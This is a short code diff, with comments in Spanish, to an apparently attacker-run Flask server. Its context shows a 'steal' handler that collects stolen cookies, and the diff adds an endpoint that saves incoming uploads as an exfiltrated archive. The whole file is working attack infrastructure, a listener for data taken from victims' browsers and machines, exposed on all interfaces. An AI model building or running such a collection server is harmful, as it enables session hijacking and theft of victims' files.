@@ -38,5 +38,12 @@ def steal():
         return "Cookie received", 200
     return "No cookie provided", 400
 
+@app.route('/recibir_archivo', methods=['POST'])
+def recibir_archivo():
+    with open('exfiltracion_recibida.tar.gz', 'wb') as f:
+        f.write(request.get_data())
+    print("Archivo exfiltrado recibido.")
+    return "ok"
+
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5001, debug=True)
